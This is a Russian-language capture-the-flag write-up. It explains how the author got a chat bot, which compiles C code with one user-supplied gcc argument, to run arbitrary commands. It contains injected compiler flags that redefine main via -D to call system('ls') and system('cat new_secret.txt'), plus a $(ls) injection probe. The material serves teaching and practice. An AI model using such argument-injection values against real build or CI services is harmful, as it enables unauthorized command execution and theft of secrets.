# Капибудильник

## Описание

> Теплый капибассейн — излюбленное место для отдыха горожан. В нем всегда поддерживается оптимальная температура. Недавно в капибассейн для красоты добавили фрукты юдзу.
> Они тут же закупорили термодатчики, и вода остыла.
>
> Помогите нашему инженеру и найдите ключ от термодатчиков, пока капибары не простудились!


## Решение

Заходит по ssh и попадаем в чат, где "Капинженер" просит ему помочь скомпилировать прогу:
`````c
<system> 'Капинженер' создал чат
<system> 'КапиСпасатель' вошёл в чат
<Капинженер> О ты пришёл! Я поменял термодатчит, но программа от предыдущего разработчика не компилируется!
<Капинженер> Помоги скомпилировать прогу, там чёт не хватает.
<Капинженер> У меня есть main.c файл:
```
#include "basin-control/lib.h"

#include <unistd.h>
#include <stdlib.h>

#define EXIT_ON_ERROR(exp) \
if ((exp) < 0) { \
    perror(# exp); \
    return -1; \
}

int main()
{
    EXIT_ON_ERROR(basic_control_init());
    EXIT_ON_ERROR(basic_control_auth("./secret.txt"));

    float good_capi_temperature = 23.5;
    EXIT_ON_ERROR(basic_control_set_water_heater_target_temp(good_capi_temperature));
    EXIT_ON_ERROR(basic_control_do_restart());

    float current_capi_temperature = basic_control_get_water_temp();
    while (current_capi_temperature < good_capi_temperature)
    {
        printf("Капибары всё ещё мёрзнут при %f °C\n", current_capi_temperature);
        sleep(1);
        current_capi_temperature = basic_control_get_water_temp();
    }

    printf("Ура! t=%f °C! Капибары чилят\n", current_capi_temperature);

    return 0;
}
```
<Капинженер> Компилирую вот так: gcc main.c -std=c11 -L. -lbasin-control -o main
<Капинженер> И получаю такую ошибку:

main.c:8:5: error: implicit declaration of function 'perror' [-Wimplicit-function-declaration]
    8 |     perror(# exp); \
      |     ^~~~~~
main.c:14:5: note: in expansion of macro 'EXIT_ON_ERROR'
   14 |     EXIT_ON_ERROR(basic_control_init());
      |     ^~~~~~~~~~~~~
main.c:24:9: error: implicit declaration of function 'printf' [-Wimplicit-function-declaration]
   24 |         printf("Капибары всё ещё мёрзнут при %f °C\n", current_capi_temperature);
      |         ^~~~~~
main.c:5:1: note: include '<stdio.h>' or provide a declaration of 'printf'
    4 | #include <stdlib.h>
  +++ |+#include <stdio.h>
    5 |
main.c:24:9: warning: incompatible implicit declaration of built-in function 'printf' [-Wbuiltin-declaration-mismatch]
   24 |         printf("Капибары всё ещё мёрзнут при %f °C\n", current_capi_temperature);
      |         ^~~~~~
main.c:24:9: note: include '<stdio.h>' or provide a declaration of 'printf'
main.c:29:5: warning: incompatible implicit declaration of built-in function 'printf' [-Wbuiltin-declaration-mismatch]
   29 |     printf("Ура! t=%f °C! Капибары чилят\n", current_capi_temperature);
      |     ^~~~~~
main.c:29:5: note: include '<stdio.h>' or provide a declaration of 'printf'


<Капинженер> Чо сюда вставить: gcc main.c -std=c11 -L. -lbasin-control →???← -o main
<КапиСпасатель>
`````

Посмотрим на ошибку:
```sh
main.c:8:5: error: implicit declaration of function 'perror' [-Wimplicit-function-declaration]
    8 |     perror(# exp); \
...
main.c:29:5: note: include '<stdio.h>' or provide a declaration of 'printf
```

Чтобы скомпилировать надо заинклюдить `stdio.h`, через опции компилятора это сделать просто: `-include stdio.h`.

Отправляем:
```sh
<КапиСпасатель> -include stdio.h
<Капинженер> Ща попробуем
<Капинженер> Запускаю: gcc main.c -std=c11 -L. -lbasin-control -include stdio.h -o main

<Капинженер> Агонь, оно успешно скомпилировалось. Ща запущу:
invalid secret format: expected tctf{...}, got: 'the secret has been moved to new_secret.txt
'
basic_control_auth("./secret.txt"): Operation not permitted

<Капинженер> Блииин, похоже нужно new_secret.txt посмотреть!
```

Ага, получается прога скомпилировалась и запустилась, но чтобы спасти капибар надо открывать `new_secret.txt`, вероятно там же флаг.

Посмотрим что у нас есть, возможно у нас есть shell injection. Чтобы проверить укажем gcc подробный режим и вставим саб команду:
```
-v $(ls)
```

Получаем выхлоп:
```sh
<КапиСпасатель> -v $(ls)
<Капинженер> Ща попробуем
<Капинженер> Запускаю: gcc main.c -std=c11 -L. -lbasin-control -v '$(ls)' -o main
...
COLLECT_GCC_OPTIONS='-std=c11' '-L.' '-v' '-o' 'main' '-mtune=generic' '-march=x86-64' '-dumpdir' 'main-'
```

Ага, значит наш ввод либо экранируется, либо здесь нет шелла.

Хорошо, а что делает бот:
1. Компилирует бинарь
2. Запускает бинарь

Получается, что если внедриться в сам исходных код, то выполнится наша команда!  
Как это сделать через командную строку компилятора? С помощью макросов препроцессора! 

1. Макросы работают по принципу подставки текста.  
2. Исполнение программы начинается с функции main. В её начало и будем внедряться.

Попробуем так:
```sh
-include stdio.h -Dmain='main(){system("ls"); return -1;} int kek'
```

Опа работает, получилось залистить диру:
```sh
<Капинженер> Ща попробуем
<Капинженер> Запускаю: gcc main.c -std=c11 -L. -lbasin-control -include stdio.h '-Dmain=main(){system("ls"); return -1;} int kek' -o main

<Капинженер> Агонь, оно успешно скомпилировалось. Ща запущу:
basin-control
libbasin-control.a
main
main.c
new_secret.txt
secret.txt
```

Попробуем катнуть секрет так:
```sh
-include stdio.h -Dmain='main(){system("cat new_secret.txt"); return -1;} int kek'
```

И всё, получаем флаг:
```sh
<Капинженер> Запускаю: gcc main.c -std=c11 -L. -lbasin-control -include stdio.h '-Dmain=main(){system("cat new_secret.txt"); return -1;} int kek' -o main

<Капинженер> Агонь, оно успешно скомпилировалось. Ща запущу:
tctf{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
